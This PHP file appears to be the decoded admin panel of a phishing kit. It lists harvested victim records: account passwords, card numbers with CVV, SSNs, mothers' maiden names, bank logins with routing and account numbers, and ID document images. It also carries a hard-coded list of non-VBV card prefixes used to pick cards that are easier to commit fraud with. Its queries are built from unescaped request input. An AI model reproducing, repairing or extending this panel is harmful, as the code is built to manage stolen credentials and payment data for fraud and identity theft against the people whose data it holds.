<?php
// Decoded by Girudatsu.com Member

$gxOTjHddKJQM = 'header';
$eiGMpXszOO_K = 'in_array';
$KYgXTiyga = 'substr';
$OxYxIKoLk = 'explode';
$LirfC_hyywx = 'substr';
$X__EmDokEJcTB = 'in_array';
$yXYpRp_H = 'substr';
$GoEtXWQz = 'strtoupper';
@session_start();
if (!isset($_SESSION['login_success'])) {
    @header('Location: ../index.php');
    exit;
}
if (isset($_POST['working'])) {
    $cr_id = $_POST['cr_id'];
    $cr_stat = $_POST['cr_stat'];
    $pdo = new PDO('sqlite:database.db');
    if ($pdo) {
        $pdo->query('' . 'UPDATE `accounts` SET `working`=\'' . "{$cr_stat}" . '\' WHERE `id`=\'' . "{$cr_id}" . '\'' . '');
    }
    exit;
}
$gxOTjHddKJQM = 'header';
$eiGMpXszOO_K = 'in_array';
$KYgXTiyga = 'substr';
$OxYxIKoLk = 'explode';
$LirfC_hyywx = 'substr';
$X__EmDokEJcTB = 'in_array';
$yXYpRp_H = 'substr';
$GoEtXWQz = 'strtoupper';
$non_vbv_list = array('479126', '410894', '427138', '480011', '439102', '498235', '478192', '476164', '432845', '488893', '432630', '456678', '406095', '462120', '465614', '435237', '456432', '456430', '460198', '456444', '443446', '455702', '414790', '450004', '424698', '498416', '463576', '463572', '478455', '463506', '422005', '463575', '430858', '471630', '515598', '516361', '550200', '521894', '512576', '516320', '516329', '544637', '528013', '543568', '546827', '555005', '540909', '531355', '529149', '514616', '556963', '540168', '564545', '512413', '576135', '551896', '552234', '546068', '543805', '455620', '415974', '523236', '455600', '456874', '490638', '420208', '413585', '546812', '415423', '428258', '427742', '465596', '419403', '462730', '460312', '520309', '542555', '546058', '455554', '464440', '436501', '436542', '414260', '413777', '447963', '448400', '425727', '440669', '447965', '448448', '485738', '447964', '445984', '491002', '542061', '542064', '546297', '546298', '547872', '516029', '486483', '455598', '454434', '454818', '494052', '456448', '443431', '443451', '468524', '409349', '493414', '443420', '552638', '456442', '456487', '450605', '443458', '421699', '456443', '521729', '443462', '443440', '443438', '421307', '541576', '421663', '523225', '525615', '421312', '424911', '424201', '426163', '456428', '471563', '448275', '448210', '424604', '485620', '478880', '479849', '448666', '448670', '442813', '441103', '491991', '488890', '480239', '480174', '487093', '479804', '479853', '412299', '474398', '493174', '482862', '428995', '473690', '403995', '400806', '402203', '403461', '403497', '404227', '470712', '480213', '480260', '471562', '427533', '478821', '414736', '479162', '482880', '431303', '426627', '414709', '455592', '482857', '447619', '451046', '431247', '469594', '518840', '408586', '408089', '543448', '546689', '451477', '552090', '554860', '411845', '544859', '552000', '426588', '400261', '498406', '490172', '422007', '552072', '552640', '552289', '400192', '434812', '516026', '416027', '416028', '416029', '426389', '434994', '438284', '440769', '440797', '490824', '415501', '417624', '520639', '528910', '540609', '548327', '428259', '450760');
$pdo = new PDO('sqlite:database.db');
$statt_normal_account = $pdo->query('SELECT count(id) FROM `accounts`')->fetchColumn();
$statt_identity_account = $pdo->query('SELECT count(id) FROM `identity`')->fetchColumn();
$statt_normal_account = $statt_normal_account - $statt_identity_account;
$statt_bank = $pdo->query('SELECT count(id) FROM `bank`')->fetchColumn();
$statt_working_good = $pdo->query('SELECT count(id) FROM `accounts` WHERE `working`=\'good\'')->fetchColumn();
$statt_working_bad = $pdo->query('SELECT count(id) FROM `accounts` WHERE `working`=\'bad\'')->fetchColumn();
$statt_cvv = $pdo->query('SELECT count(id) FROM `creditcards` WHERE `vbv_holder`=\'\'')->fetchColumn();
$statt_vbv = $pdo->query('SELECT count(id) FROM `creditcards` WHERE `vbv_holder`!=\'\'')->fetchColumn();
$statt_non_vbv = 62 + -62;
$statt_vbv_all = $pdo->query('SELECT `cc` FROM `creditcards`')->fetchAll(PDO::FETCH_ASSOC);
foreach ($statt_vbv_all as $cc) {
    if (in_array(substr($cc['cc'], 90 + -90, -12 - -18), $non_vbv_list)) {
        $statt_non_vbv++;
    }
}
?>
<script src="js/table.js" type="text/javascript"></script>

<div id="title_1">Accounts:</div>
<div id="statistic">
	<div class="statistics_x">:<?php
echo $statt_bank;
?>
</div>
	<div class="statistics_x statt_8"></div>
	<div class="statistics_x">:<?php
echo $statt_working_bad;
?>
</div>
	<div class="statistics_x statt_6"></div>
	<div class="statistics_x">:<?php
echo $statt_working_good;
?>
</div>
	<div class="statistics_x statt_7"></div>
	<div class="statistics_x">:<?php
echo $statt_non_vbv;
?>
</div>
	<div class="statistics_x statt_5"></div>
	<div class="statistics_x">:<?php
echo $statt_vbv;
?>
</div>
	<div class="statistics_x statt_4"></div>
	<div class="statistics_x">:<?php
echo $statt_cvv;
?>
</div>
	<div class="statistics_x statt_3"></div>
	<div class="statistics_x">:<?php
echo $statt_identity_account;
?>
</div>
	<div class="statistics_x statt_2"></div>
	<div class="statistics_x">:<?php
echo $statt_normal_account;
?>
</div>
	<div class="statistics_x statt_1"></div>
</div>

<div class="transparent">
	<table>
		<tr>
			<td class="x_1">Username</td>
			<td class="x_2">Password</td>
			<td class="x_3">Country</td>
			<td class="x_6">Date</td>
			<td class="x_xx">Work</td>
			<td class="x_4">View</td>
			<td class="x_5">Del</td>
		</tr>
	</table>
</div>
<?php
$gxOTjHddKJQM = 'header';
$eiGMpXszOO_K = 'in_array';
$KYgXTiyga = 'substr';
$OxYxIKoLk = 'explode';
$LirfC_hyywx = 'substr';
$X__EmDokEJcTB = 'in_array';
$yXYpRp_H = 'substr';
$GoEtXWQz = 'strtoupper';
$item_per_page = -3 - -18;
if ($pdo) {
    $just_order_by = '`has_card`=\'no\',`has_bank`=\'no\',`has_card`=\'yes\',`has_bank`=\'yes\'';
    if (isset($_GET['page']) && $_GET['page'] >= 80 + -79) {
        $offset = $_GET['page'] * $item_per_page - $item_per_page;
        $accounts = $pdo->query('' . 'SELECT * FROM `accounts` ORDER BY ' . "{$just_order_by}" . ' ASC LIMIT ' . "{$offset}" . ',' . "{$item_per_page}")->fetchAll(PDO::FETCH_ASSOC);
    } else {
        $accounts = $pdo->query('' . 'SELECT * FROM `accounts` ORDER BY ' . "{$just_order_by}" . ' ASC LIMIT 0,' . "{$item_per_page}")->fetchAll(PDO::FETCH_ASSOC);
    }
    foreach ($accounts as $ret) {
        $credit_cards = $pdo->query('SELECT * FROM `creditcards` WHERE `owner_id`=\'' . $ret['id'] . '\'')->fetch(PDO::FETCH_ASSOC);
        $bank_account = $pdo->query('SELECT * FROM `bank` WHERE `owner_id`=\'' . $ret['id'] . '\'')->fetch(PDO::FETCH_ASSOC);
        $identity = $pdo->query('SELECT * FROM `identity` WHERE `owner_id`=\'' . $ret['id'] . '\'')->fetch(PDO::FETCH_ASSOC);
        if ($identity) {
            $single_identity = explode('*_*', $identity['identities']);
        }
        ?>

<div class="line">
	<table>
		<tr>
			<td class="x_1"><?php
        echo $ret['username'];
        ?>
</td>
			<td class="x_2"><?php
        echo $ret['password'];
        ?>
</td>
			<td class="x_3"><?php
        echo $ret['country'];
        ?>
</td>
			<td class="x_6"><?php
        echo substr($ret['date_time'], 27 + -27, -28 - -38);
        ?>
</td>
			<?php
        $gxOTjHddKJQM = 'header';
        $eiGMpXszOO_K = 'in_array';
        $KYgXTiyga = 'substr';
        $OxYxIKoLk = 'explode';
        $LirfC_hyywx = 'substr';
        $X__EmDokEJcTB = 'in_array';
        $yXYpRp_H = 'substr';
        $GoEtXWQz = 'strtoupper';
        if ($ret['working'] == 'good') {
            $cr_is_good = 'cr_active';
            $cr_is_bad = '';
        } elseif ($ret['working'] == 'bad') {
            $cr_is_good = '';
            $cr_is_bad = 'cr_active';
        } else {
            $cr_is_good = '';
            $cr_is_bad = '';
        }
        if ($identity) {
            $has_an_id = 'y_1';
        } else {
            $has_an_id = 'y_1_1';
        }
        if ($credit_cards['vbv_dob'] == '') {
            $has_a_vbv = 'y_2';
        } elseif (in_array(substr($credit_cards['cc'], -46 - -46, 83 + -77), $non_vbv_list)) {
            $has_a_vbv = 'y_2_2';
        } else {
            $has_a_vbv = 'y_2_1';
        }
        ?>
			<td class="x_xx">
				<div id="cr_good_<?php
        echo $ret['id'];
        ?>
" class="cr_1 <?php
        echo $cr_is_good;
        ?>
" cr="<?php
        echo $ret['id'];
        ?>
"></div>
				<div id="cr_bad_<?php
        echo $ret['id'];
        ?>
" class="cr_2 <?php
        echo $cr_is_bad;
        ?>
" cr="<?php
        echo $ret['id'];
        ?>
"></div>
			</td>
			<td class="x_4">
				<div class="<?php
        echo $has_an_id;
        ?>
 view_x" x="<?php
        echo $ret['id'];
        ?>
" y="account_details_<?php
        echo $ret['id'];
        ?>
" titele="viw account infromation"></div>
				<div class="<?php
        echo $has_a_vbv;
        ?>
 view_x <?php
        $gxOTjHddKJQM = 'header';
        $eiGMpXszOO_K = 'in_array';
        $KYgXTiyga = 'substr';
        $OxYxIKoLk = 'explode';
        $LirfC_hyywx = 'substr';
        $X__EmDokEJcTB = 'in_array';
        $yXYpRp_H = 'substr';
        $GoEtXWQz = 'strtoupper';
        if (!$credit_cards) {
            echo 'no';
        }
        ?>
" <?php
        $gxOTjHddKJQM = 'header';
        $eiGMpXszOO_K = 'in_array';
        $KYgXTiyga = 'substr';
        $OxYxIKoLk = 'explode';
        $LirfC_hyywx = 'substr';
        $X__EmDokEJcTB = 'in_array';
        $yXYpRp_H = 'substr';
        $GoEtXWQz = 'strtoupper';
        if ($credit_cards) {
            echo 'x=\'' . $ret['id'] . '\'';
        }
        ?>
 y="creditcard_details_<?php
        echo $ret['id'];
        ?>
" title="view credit card"></div>
				<div class="y_3 view_x <?php
        $gxOTjHddKJQM = 'header';
        $eiGMpXszOO_K = 'in_array';
        $KYgXTiyga = 'substr';
        $OxYxIKoLk = 'explode';
        $LirfC_hyywx = 'substr';
        $X__EmDokEJcTB = 'in_array';
        $yXYpRp_H = 'substr';
        $GoEtXWQz = 'strtoupper';
        if (!$bank_account) {
            echo 'no';
        }
        ?>
" <?php
        $gxOTjHddKJQM = 'header';
        $eiGMpXszOO_K = 'in_array';
        $KYgXTiyga = 'substr';
        $OxYxIKoLk = 'explode';
        $LirfC_hyywx = 'substr';
        $X__EmDokEJcTB = 'in_array';
        $yXYpRp_H = 'substr';
        $GoEtXWQz = 'strtoupper';
        if ($bank_account) {
            echo 'x=\'' . $ret['id'] . '\'';
        }
        ?>
 y="bank_details_<?php
        echo $ret['id'];
        ?>
" title="view bank infromation"></div>
				<div class="y_4 view_x" x="<?php
        echo $ret['id'];
        ?>
" y="clipboard_details_<?php
        echo $ret['id'];
        ?>
" title="copy to clipboard"></div>
			</td>
			<td class="x_5"><div xdelete="<?php
        echo $ret['id'];
        ?>
" class="z_1" title="delete"></div></td>
		</tr>
	</table>
	<div id="account_details_<?php
        echo $ret['id'];
        ?>
" class="account_details">
		<table>
			<tr><td>Username:</td><td><?php
        echo $ret['username'];
        ?>
</td></tr>
			<tr><td>Password:</td><td><?php
        echo $ret['password'];
        ?>
</td></tr>
			<tr><td>IP Address:</td><td><?php
        echo $ret['ip'];
        ?>
</td></tr>
			<tr><td>Browser:</td><td><?php
        echo $ret['browser'];
        ?>
</td></tr>
			<tr><td>Sys Language:</td><td><?php
        echo $ret['account_language'];
        ?>
</td></tr>
			<tr><td>O.System:</td><td><?php
        echo $ret['os'] . ', ' . $ret['platform'];
        ?>
</td></tr>
			<tr><td>Date & Time:</td><td><?php
        echo strtoupper($ret['date_time']);
        ?>
 (Server Side)</td></tr>
			<tr><td>Time Zone:</td><td><?php
        echo $ret['timezone'];
        ?>
</td></tr>
			<tr><td>Resolution:</td><td><?php
        echo $ret['resolution'];
        ?>
</td></tr>
			<tr><td>User Agent:</td><td><?php
        echo $ret['useragent'];
        ?>
</td></tr>
			<tr><td>Location:</td><td><?php
        echo $ret['location'];
        ?>
</td></tr>
			<?php
        $gxOTjHddKJQM = 'header';
        $eiGMpXszOO_K = 'in_array';
        $KYgXTiyga = 'substr';
        $OxYxIKoLk = 'explode';
        $LirfC_hyywx = 'substr';
        $X__EmDokEJcTB = 'in_array';
        $yXYpRp_H = 'substr';
        $GoEtXWQz = 'strtoupper';
        if ($identity) {
            ?>
			<tr><td>Identities:</td><td> <?php
            $gxOTjHddKJQM = 'header';
            $eiGMpXszOO_K = 'in_array';
            $KYgXTiyga = 'substr';
            $OxYxIKoLk = 'explode';
            $LirfC_hyywx = 'substr';
            $X__EmDokEJcTB = 'in_array';
            $yXYpRp_H = 'substr';
            $GoEtXWQz = 'strtoupper';
            foreach ($single_identity as $value) {
                if ($value != '') {
                    echo '' . '<a href=\'' . "{$value}" . '\' target=\'_blank\'><img class=\'identities\' src=\'' . "{$value}" . '\'></a>' . '';
                }
            }
            ?>
 </td></tr>
			<tr><td>Document Type:</td><td><?php
            echo $identity['document_type'];
            ?>
</td></tr>
			<tr><td>Drive ID Number:</td><td><?php
            echo $identity['driver_number'];
            ?>
</td></tr>
			<tr><td>Drive ID Issued By:</td><td><?php
            echo $identity['driver_issued_by'];
            ?>
</td></tr>
			<tr><td>Drive ID Expire Date:</td><td><?php
            echo $identity['driver_expire_date'];
            ?>
</td></tr>
			<?php
            $gxOTjHddKJQM = 'header';
            $eiGMpXszOO_K = 'in_array';
            $KYgXTiyga = 'substr';
            $OxYxIKoLk = 'explode';
            $LirfC_hyywx = 'substr';
            $X__EmDokEJcTB = 'in_array';
            $yXYpRp_H = 'substr';
            $GoEtXWQz = 'strtoupper';
        }
        ?>

		</table>
	</div>
<?php
        $gxOTjHddKJQM = 'header';
        $eiGMpXszOO_K = 'in_array';
        $KYgXTiyga = 'substr';
        $OxYxIKoLk = 'explode';
        $LirfC_hyywx = 'substr';
        $X__EmDokEJcTB = 'in_array';
        $yXYpRp_H = 'substr';
        $GoEtXWQz = 'strtoupper';
        $lst_ssn = array('United States');
        $lst_mmn = array('United States', 'Ireland', 'Germany', 'Switzerland', 'United Kingdom', 'Canada');
        $lst_acc = array('Ireland', 'Germany', 'Switzerland', 'United Kingdom', 'Finland');
        $lst_srt = array('United Kingdom');
        $gxOTjHddKJQM = 'header';
        $eiGMpXszOO_K = 'in_array';
        $KYgXTiyga = 'substr';
        $OxYxIKoLk = 'explode';
        $LirfC_hyywx = 'substr';
        $X__EmDokEJcTB = 'in_array';
        $yXYpRp_H = 'substr';
        $GoEtXWQz = 'strtoupper';
        if ($credit_cards) {
            ?>
	<div id="creditcard_details_<?php
            echo $ret['id'];
            ?>
" class="creditcard_details">
		<table>
			<tr><td>Card Holder:</td><td><?php
            echo $credit_cards['vbv_holder'];
            ?>
</td></tr>
			<tr><td>Card Number:</td><td><?php
            echo $credit_cards['cc'];
            ?>
</td></tr>
			<tr><td>Expire Date:</td><td><?php
            echo $credit_cards['exp'];
            ?>
</td></tr>
			<tr><td>CVV/CVV2:</td><td><?php
            echo $credit_cards['cvv'];
            ?>
</td></tr>
			<tr><td>Date of Birth:</td><td><?php
            echo $credit_cards['vbv_dob'];
            ?>
</td></tr>
			<tr><td>Social Security Number:</td><td><?php
            echo $credit_cards['vbv_ssn'];
            ?>
</td></tr>
			<tr><td>Mother's Middle Name:</td><td><?php
            echo $credit_cards['vbv_mmn'];
            ?>
</td></tr>
			<tr><td>Account Number:</td><td><?php
            echo $credit_cards['acc_num'];
            ?>
</td></tr>
			<tr><td>Sort Code:</td><td><?php
            echo $credit_cards['vbv_sort'];
            ?>
</td></tr>
			<tr><td>Phone Number:</td><td>+<?php
            echo $credit_cards['phone_number'];
            ?>
</td></tr>
			<tr><td>Full Address:</td><td><?php
            echo $ret['address'];
            ?>
</td></tr>
			<tr><td>Card Name:</td><td><?php
            echo $credit_cards['cardname'];
            ?>
</td></tr>
			<tr><td>Card Type:</td><td><?php
            echo $credit_cards['type'];
            ?>
</td></tr>
			<tr><td>Card Level:</td><td><?php
            echo $credit_cards['level'];
            ?>
</td></tr>
			<tr><td>Bank Name:</td><td><?php
            echo $credit_cards['bank_name'];
            ?>
</td></tr>
			<tr><td>Bank Country:</td><td><?php
            echo $credit_cards['bank_country'];
            ?>
</td></tr>
			<tr><td>Bank Website:</td><td><?php
            echo $credit_cards['bank_website'];
            ?>
</td></tr>
			<tr><td>Bank Phone:</td><td><?php
            echo $credit_cards['bank_phone'];
            ?>
</td></tr>
		</table>
	</div>
<?php
            $gxOTjHddKJQM = 'header';
            $eiGMpXszOO_K = 'in_array';
            $KYgXTiyga = 'substr';
            $OxYxIKoLk = 'explode';
            $LirfC_hyywx = 'substr';
            $X__EmDokEJcTB = 'in_array';
            $yXYpRp_H = 'substr';
            $GoEtXWQz = 'strtoupper';
        }
        $gxOTjHddKJQM = 'header';
        $eiGMpXszOO_K = 'in_array';
        $KYgXTiyga = 'substr';
        $OxYxIKoLk = 'explode';
        $LirfC_hyywx = 'substr';
        $X__EmDokEJcTB = 'in_array';
        $yXYpRp_H = 'substr';
        $GoEtXWQz = 'strtoupper';
        if ($bank_account) {
            ?>
	<div id="bank_details_<?php
            echo $ret['id'];
            ?>
" class="bank_details">
		<table>
			<tr><td>Bank Name:</td><td><?php
            echo $bank_account['bank_name'];
            ?>
</td></tr>
			<tr><td>Username:</td><td><?php
            echo $bank_account['username'];
            ?>
</td></tr>
			<tr><td>Password:</td><td><?php
            echo $bank_account['password'];
            ?>
</td></tr>
			<tr><td>Account Type:</td><td><?php
            echo $bank_account['checking_or_savings'];
            ?>
</td></tr>
			<tr><td>Routing Number:</td><td><?php
            echo $bank_account['routing_number'];
            ?>
</td></tr>
			<tr><td>Account Number:</td><td><?php
            echo $bank_account['account_number'];
            ?>
</td></tr>
		</table>
	</div>
<?php
            $gxOTjHddKJQM = 'header';
            $eiGMpXszOO_K = 'in_array';
            $KYgXTiyga = 'substr';
            $OxYxIKoLk = 'explode';
            $LirfC_hyywx = 'substr';
            $X__EmDokEJcTB = 'in_array';
            $yXYpRp_H = 'substr';
            $GoEtXWQz = 'strtoupper';
        }
        ?>
</div>
<input type="hidden" name="x_page" id="x_page" value="<?php
        echo $_GET['page'];
        ?>
">
<?php
        $gxOTjHddKJQM = 'header';
        $eiGMpXszOO_K = 'in_array';
        $KYgXTiyga = 'substr';
        $OxYxIKoLk = 'explode';
        $LirfC_hyywx = 'substr';
        $X__EmDokEJcTB = 'in_array';
        $yXYpRp_H = 'substr';
        $GoEtXWQz = 'strtoupper';
    }
}
?>



<?php
$gxOTjHddKJQM = 'header';
$eiGMpXszOO_K = 'in_array';
$KYgXTiyga = 'substr';
$OxYxIKoLk = 'explode';
$LirfC_hyywx = 'substr';
$X__EmDokEJcTB = 'in_array';
$yXYpRp_H = 'substr';
$GoEtXWQz = 'strtoupper';
$pagination = $pdo->query('SELECT count(id) FROM `accounts`')->fetch(PDO::FETCH_NUM);
if ($pagination[71 + -71] > $item_per_page) {
    ?>
	<div class="transparent">
		<center>
			<?php
    $gxOTjHddKJQM = 'header';
    $eiGMpXszOO_K = 'in_array';
    $KYgXTiyga = 'substr';
    $OxYxIKoLk = 'explode';
    $LirfC_hyywx = 'substr';
    $X__EmDokEJcTB = 'in_array';
    $yXYpRp_H = 'substr';
    $GoEtXWQz = 'strtoupper';
    $items_id = $pagination[-32 - -32] / $item_per_page + (15 + -14);
    $page = isset($_GET['page']) ? $_GET['page'] : 95 + -94;
    for ($i = -69 - -70; $i < $items_id; $i++) {
        if ($page == $i) {
            echo '' . '<div class=\'pagination pg_active\' page=\'' . "{$i}" . '\'>' . "{$i}" . '</div>' . '';
        } else {
            echo '' . '<div class=\'pagination\' page=\'' . "{$i}" . '\'>' . "{$i}" . '</div>' . '';
        }
    }
    ?>
		</center>
	</div>
<?php
    $gxOTjHddKJQM = 'header';
    $eiGMpXszOO_K = 'in_array';
    $KYgXTiyga = 'substr';
    $OxYxIKoLk = 'explode';
    $LirfC_hyywx = 'substr';
    $X__EmDokEJcTB = 'in_array';
    $yXYpRp_H = 'substr';
    $GoEtXWQz = 'strtoupper';
}
?>
